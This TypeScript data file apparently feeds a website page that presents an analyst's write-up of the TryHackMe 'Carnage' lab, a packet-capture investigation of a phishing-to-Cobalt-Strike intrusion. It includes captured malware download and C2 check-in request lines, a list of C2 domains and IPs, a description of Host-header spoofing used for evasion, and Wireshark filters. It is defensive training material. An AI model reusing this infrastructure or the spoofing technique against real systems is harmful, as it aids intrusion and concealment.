/**
 * Operation Carnage incident report.
 *
 * Source of truth for the prose is app/config/incident_carnage.md — if that file
 * is revised, mirror the change here. Screenshots from the original Word export
 * are deliberately not published; the Drive PDF carries them.
 */

export const CARNAGE_META = {
  title: "Operation Carnage",
  subtitle: "PCAP network intrusion analysis — Cobalt Strike kill chain",
  analyst: "Bradley King'ori",
  date: "16 August 2025",
  classification: "Incident report on the Cobalt Strike kill chain",
  room: {
    label: 'TryHackMe "Carnage" (SOC Level 1)',
    url: "https://tryhackme.com/room/c2carnage",
  },
  /** Full report, screenshots included, hosted on Drive. */
  download: {
    label: "Download full report (PDF)",
    url: "https://drive.google.com/file/d/18NW1ywPkDPeez2NhJ-gzbXgoVNrdqj2A/view?usp=drive_link",
  },
  readingTime: "9 min read",
};

export const CARNAGE_SUMMARY =
  "A user, Eric, was subjected to a phishing email leading to a compromised workstation. The multi-stage intrusion began with the download of a malicious ZIP archive from an external server (attirenepal.com), followed by a burst of TLS connections to three additional external domains (finejewels.com.au, thietbiagt.com, new.americold.com) used to stage further malicious files, then check-in traffic to a first-stage command-and-control (C2) domain, and culminating in the deployment of two Cobalt Strike C2 channels. The Cobalt Strike IP addresses used during this session were independently confirmed as known C2 infrastructure via VirusTotal community intelligence. This workstation represents a full macro-to-C2 compromise chain and, if left unmitigated, would have given the attacker persistent remote access to the host.";

export const CARNAGE_SCOPE = [
  { label: "Data source analyzed", value: "carnage.pcap" },
  {
    label: "Tools used",
    value:
      "Wireshark (Follow TCP Stream, Conversations, TLS/HTTP filters), VirusTotal Community",
  },
  {
    label: "Objective",
    value:
      "Identify the delivery mechanism, first-stage C2 channel, and Cobalt Strike infrastructure used in the intrusion, extract IOCs, and map behaviour to MITRE ATT&CK.",
  },
];

export type TimelineEntry = { time: string; event: string; evidence: string };

export const CARNAGE_TIMELINE: TimelineEntry[] = [
  {
    time: "2021-09-24 16:44:38",
    event:
      "First HTTP connection to malicious host attirenepal.com (85.187.128.24)",
    evidence: "Packet 1735",
  },
  {
    time: "2021-09-24 16:44:38",
    event: "GET /incidunt-consequatur/documents.zip issued",
    evidence: "HTTP request, stream 73",
  },
  {
    time: "2021-09-24 16:44:41",
    event:
      "Server responds 200 OK, delivers documents.zip (contains chart-1530076591.xls)",
    evidence: "Packet 2173",
  },
  {
    time: "2021-09-24 16:45:11 – 16:45:12",
    event: "TLS session with finejewels.com.au — additional malicious file download",
    evidence: "TLS Client Hello / Cert exchange",
  },
  {
    time: "2021-09-24 16:45:21 – 16:45:22",
    event: "TLS session with thietbiagt.com — additional malicious file download",
    evidence: "TLS Client Hello / App Data",
  },
  {
    time: "2021-09-24 16:45:25 – 16:45:26",
    event: "TLS session with new.americold.com — additional malicious file download",
    evidence: "TLS Client Hello / App Data",
  },
  {
    time: "2021-09-24 16:46:16",
    event: "First POST check-in to first-stage C2 domain maldivehost.net (208.91.128.6)",
    evidence: "Packet 3822, 281 bytes",
  },
  {
    time: "2021-09-24 16:46:16 – 16:57:15",
    event:
      "Recurring POST check-ins to maldivehost.net using URI pattern /zLIisQRWZI9/<base64 blob>",
    evidence: "Multiple packets, http.request.method == POST",
  },
  {
    time: "2021-09-24 16:55:05 – 16:55:19",
    event:
      "TLS sessions established with Cobalt Strike server #2, securitybusinpuff.com (185.125.204.174:8080)",
    evidence: "Stream analysis, ip.addr == 185.125.204.174",
  },
  {
    time: "2021-09-24 16:55:08",
    event:
      "TLS session with Cobalt Strike server #1, survmeter.live (185.106.96.158), Host header spoofed as ocsp.verisign.com",
    evidence: "Stream 163",
  },
];

export type Finding = {
  heading: string;
  /** Prose paragraphs. */
  body: string[];
  /** Wireshark filters / raw stream excerpts shown in a terminal block. */
  commands?: { label: string; lines: string[] }[];
  /** Bullet observations. */
  points?: string[];
};

export const CARNAGE_FINDINGS: Finding[] = [
  {
    heading: "4.1 Initial access / delivery",
    body: [
      "The victim host retrieved a ZIP archive from an external server. Following the TCP stream exposed both the request and the server banner behind it.",
      "The archive contained a single file, chart-1530076591.xls, visible in the raw stream as a ZIP local file header (PK....chart-1530076591.xls), which is consistent with a malicious document-based initial access technique.",
    ],
    commands: [
      { label: "Display filter", lines: ["http"] },
      {
        label: "Follow TCP stream",
        lines: [
          "GET /incidunt-consequatur/documents.zip HTTP/1.1",
          "Host: attirenepal.com",
          "",
          "Server: LiteSpeed",
          "x-powered-by: PHP/7.2.34",
          "content-disposition: attachment; filename=documents.zip",
        ],
      },
    ],
  },
  {
    heading: "4.2 First-stage C2 channel",
    body: [
      "Shortly after the document was retrieved, the host began issuing regular HTTP POST requests to maldivehost.net (208.91.128.6).",
    ],
    commands: [
      { label: "Display filter", lines: ['http.request.method == "POST"'] },
      {
        label: "Follow TCP stream",
        lines: ["POST /zLIisQRWZI9/OQsaDixzHTgtfjMcGypGenpldWF5eWV9f3k= HTTP/1.1"],
      },
    ],
    points: [
      "First packet check-in length: 281 bytes.",
      "The path prefix /zLIisQRWZI9 remained constant across dozens of these requests over a 12-minute window — consistent with a scripted, periodic C2 check-in.",
    ],
  },
  {
    heading: "4.3 Cobalt Strike deployment",
    body: [
      "Traffic pivoted to two additional external hosts, both later confirmed via VirusTotal community annotations as active Cobalt Strike C2 servers.",
      "Evasion technique observed: connections to 185.106.96.158 were sent with the HTTP Host header set to ocsp.verisign.com — a legitimate certificate-authority domain — despite the underlying TCP connection going directly to the attacker-controlled IP. This is an obfuscation technique intended to make the traffic look like routine OCSP certificate-validation traffic to a defender skimming logs.",
    ],
  },
  {
    heading: "4.4 Secondary malicious file downloads",
    body: [
      "In the roughly 90 seconds immediately following the documents.zip retrieval and before the first check-in fired, the host established TLS connections to three additional external domains confirmed as involved in malicious file download activity.",
      "The certificate presented during the finejewels.com.au handshake was issued by GoDaddy.com — likely a legitimate, compromised domain being abused to serve additional payload components rather than infrastructure the attacker owns outright. This staged, multi-domain download pattern occurring within a single burst is consistent with a threat actor pulling down supporting configuration modules before initiating the next stage.",
    ],
    commands: [{ label: "Display filter", lines: ["tls"] }],
    points: [
      "finejewels.com.au @ 16:45:11",
      "thietbiagt.com @ 16:45:21",
      "new.americold.com @ 16:45:25",
    ],
  },
  {
    heading: "4.5 Host discovery and spam relay",
    body: [
      "Immediately afterwards the malware attempted to identify which machine it had compromised by performing a DNS query, resolving api.ipify.org to look up the host's external IP address.",
      "After this stage the malware attempted to further abuse the machine by relaying spam. Filtering the capture for SMTP envelope senders identified farshin@mailfa.com as the sending address. Conversation statistics show one session to 185.125.204.174:8080 alone accounted for 1,439 packets — the largest transfer in the capture, indicating this was the primary active channel.",
    ],
    commands: [
      { label: "Display filter", lines: ["dns"] },
      { label: "Display filter", lines: ['frame contains "MAIL FROM"'] },
    ],
  },
];

export type Ioc = { type: string; indicator: string; context: string };

export const CARNAGE_IOCS: Ioc[] = [
  { type: "Domain", indicator: "attirenepal.com", context: "Initial malicious document host" },
  { type: "IP", indicator: "85.187.128.24", context: "Resolves attirenepal.com" },
  { type: "File", indicator: "documents.zip", context: "Delivered archive" },
  { type: "File", indicator: "chart-1530076591.xls", context: "Payload inside archive" },
  { type: "Web server", indicator: "LiteSpeed", context: "Server header on attirenepal.com response" },
  { type: "Web server version", indicator: "PHP/7.2.34", context: "x-powered-by header on attirenepal.com response" },
  { type: "Domain", indicator: "finejewels.com.au", context: "Secondary malicious file download (TLS)" },
  { type: "Domain", indicator: "thietbiagt.com", context: "Secondary malicious file download (TLS)" },
  { type: "Domain", indicator: "new.americold.com", context: "Secondary malicious file download (TLS)" },
  { type: "Domain", indicator: "maldivehost.net", context: "First-stage / loader C2" },
  { type: "IP", indicator: "208.91.128.6", context: "Resolves maldivehost.net" },
  { type: "URI pattern", indicator: "/zLIisQRWZI9/<data>", context: "Loader check-in path" },
  { type: "Domain", indicator: "survmeter.live", context: "Cobalt Strike C2 #1" },
  { type: "IP", indicator: "185.106.96.158", context: "Cobalt Strike C2 #1" },
  { type: "Domain", indicator: "securitybusinpuff.com", context: "Cobalt Strike C2 #2" },
  { type: "IP", indicator: "185.125.204.174", context: "Cobalt Strike C2 #2 (ports 80 and 8080)" },
  { type: "Spoofed Host", indicator: "ocsp.verisign.com", context: "Used against C2 #1 for traffic blending" },
  { type: "Email", indicator: "farshin@mailfa.com", context: "SMTP envelope sender of relayed spam" },
];

export const CARNAGE_C2_TABLE = [
  {
    ip: "185.106.96.158",
    domain: "survmeter.live",
    confirmation: "Cobalt Strike infrastructure",
  },
  {
    ip: "185.125.204.174",
    domain: "securitybusinpuff.com",
    confirmation: "Confirmed C2 on ports 80 & 8080 (HTTPS)",
  },
];

export type AttackEntry = {
  tactic: string;
  technique: string;
  id: string;
  evidence: string;
};

export const CARNAGE_ATTACK: AttackEntry[] = [
  {
    tactic: "Execution",
    technique: "User Execution: Malicious File (pending confirmation of macro content)",
    id: "T1204.002",
    evidence: "chart-1530076591.xls extracted from archive",
  },
  {
    tactic: "Command and Control",
    technique: "Application Layer Protocol: Web Protocols",
    id: "T1071.001",
    evidence: "HTTP POST check-ins to maldivehost.net",
  },
  {
    tactic: "Command and Control",
    technique: "Application Layer Protocol: Web Protocols (encrypted)",
    id: "T1071.001 / T1573",
    evidence: "HTTPS sessions to both Cobalt Strike IPs",
  },
  {
    tactic: "Defense Evasion",
    technique: "Masquerading",
    id: "T1036.005",
    evidence: "Host header spoofed as ocsp.verisign.com",
  },
  {
    tactic: "Command and Control",
    technique: "Ingress Tool Transfer",
    id: "T1105",
    evidence: "Download of documents.zip payload",
  },
];

export const CARNAGE_IMPACT =
  "The identification of live, confirmed Cobalt Strike traffic indicates the attacker had an active command channel to the host. Cobalt Strike is commonly employed for post-exploitation activity including credential harvesting, lateral movement, and the staging of ransomware or additional payloads. The 12-minute gap between initial execution of the document and full Cobalt Strike deployment suggests a swift, likely automated staging chain rather than manual hands-on-keyboard activity at this point in the capture.";

export type Recommendation = { horizon: string; text: string };

export const CARNAGE_RECOMMENDATIONS: Recommendation[] = [
  {
    horizon: "Immediate",
    text: "Block all identified C2 IPs and domains (185.106.96.158, 185.125.204.174, maldivehost.net, attirenepal.com, finejewels.com.au, thietbiagt.com, new.americold.com) at the perimeter firewall and DNS resolver.",
  },
  {
    horizon: "Short-term",
    text: "Alert on HTTP requests where the Host header does not match the destination IP's expected identity — the ocsp.verisign.com spoof would have been caught by this rule alone.",
  },
  {
    horizon: "Long-term",
    text: "Restrict execution of macros in Office documents originating from the internet, and sandbox all attachments containing macro-enabled Office files before delivery to end users. Pair this with mandatory user training on unsolicited document downloads from unknown sources.",
  },
];

export const CARNAGE_CONCLUSION =
  "This capture documents a complete phishing-to-Cobalt-Strike compromise chain in a working environment: the payload delivered via an emailed ZIP archive, a first-stage HTTP channel established to hold the foothold, and finally full Cobalt Strike C2 deployed behind deliberate traffic-masking techniques such as spoofed Host headers. The nature of the infrastructure was substantiated via VirusTotal community intelligence, giving high confidence in the IOCs listed above.";
